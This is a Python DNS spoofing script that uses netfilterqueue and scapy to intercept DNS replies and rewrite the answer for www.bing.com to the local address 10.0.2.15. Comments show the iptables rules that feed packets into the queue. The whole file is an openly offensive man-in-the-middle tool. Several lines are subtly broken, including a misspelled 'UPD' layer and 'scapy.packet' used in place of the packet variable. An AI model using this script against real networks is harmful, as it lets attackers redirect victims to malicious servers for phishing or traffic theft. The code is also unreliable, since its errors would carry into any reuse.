#!/usr/bin/env python

from netfilterqueue import NetfilterQueue
import scapy.all as scapy


def process_packet(packet):                                     # packet_name[layer_name].field_name
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):           # DNSRR = DNS Resource Record , DNSQR = DNS Question Record
        qname = scapy_packet[scapy.DNSQR].qname      # Target website(qname in DNSQR  field)
        if "www.bing.com" in qname:
            print("[+] Spoofing Target")             # 'A' record converts domain names to IP
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.15")  # rrname->> Resource record name
            scapy_packet[scapy.DNS].an = answer                   # rdata->>  IP of the webserver i.e, www.bing.com here
            scapy_packet[scapy.DNS].ancount = 1

            del scapy.packet[scapy.IP].len  # length/size of the layer
            del scapy.packet[scapy.IP].chksum  # checksum is used to make sure that the packet has not been modified
            del scapy.packet[scapy.UPD].len
            del scapy.packet[scapy.UPD].chksum

            packet.set_payload(str(scapy_packet))  # Changing original packet with scapy packet
    packet.accept()


try:
    queue = NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\n[-] Keyboard Interruption detected ... Quitting.")

# use iptables(for modifying routing rules) -I INPUT -j NFQUEUE --queue-num 0 &
# iptables -I OUTPUT -j NFQUEUE --queue-num 0 for same interface
# Forward chain for the same network
